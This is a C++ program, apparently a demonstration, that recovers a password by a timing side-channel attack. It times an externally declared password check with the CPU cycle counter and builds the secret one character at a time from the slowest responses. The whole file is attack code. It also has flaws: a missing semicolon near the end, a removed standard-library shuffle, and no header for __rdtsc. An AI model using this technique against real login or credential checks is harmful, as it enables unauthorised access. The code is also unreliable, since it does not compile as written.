#include <iostream>
#include <cstring>
#include <vector>
#include <map>
#include <algorithm>
#include <cstdint>
#include <numeric>
#include <array>

constexpr int max_password_size = 20;

volatile unsigned int junk = 0;
bool test_pass(char *user_pass);

// attack
inline uint64_t read_rdtsc(void)
{
    uint64_t d=__rdtsc();
    //__asm__ __volatile__ ("rdtsc" : "=A" (d));
    return d;
}

bool brute_letter(char *user_pass, int ndx)
{
    std::map<char, unsigned int> scores;
    std::array<char, 94> order;

    std::iota(std::begin(order), std::end(order), ' ');

    for (int iters = 0; iters < 20; iters++) {
        // test letters in random order to confuse branch predictor
        std::random_shuffle(order.begin(), order.end());

        for (auto ci = order.begin(); ci != order.end(); ++ci) {
            user_pass[ndx] = *ci;

            if (test_pass(user_pass)) {
                return true;
            }

            uint64_t tstart = read_rdtsc();
            junk = test_pass(user_pass);
            uint64_t tend = read_rdtsc() - tstart;

            scores[*ci] += tend;
        }
    }

    // find which character has the highest score
    auto comparator = [](const std::pair<char, unsigned int>& p1, const std::pair<char, unsigned int>& p2) {
        return p1.second < p2.second;
    };
    auto best_char = std::max_element(scores.begin(), scores.end(), comparator);

    // this character is a part of password
    user_pass[ndx] = best_char->first;

    return false;
}

int main()
{
    while (true) {
        char user_pass[max_password_size+1] = {0};

        for (int i = 0; i < max_password_size; i++) {
            if (brute_letter(user_pass, i)) {
                std::cout << "FOUND PASSWORD: " << user_pass << std::endl;
				system("pause");
                return 0;
            }

            std::cout << user_pass << std::endl;
        }

        std::cout << "Failed this time" << std::endl;
    }

	system("pause")
    return 0;
}

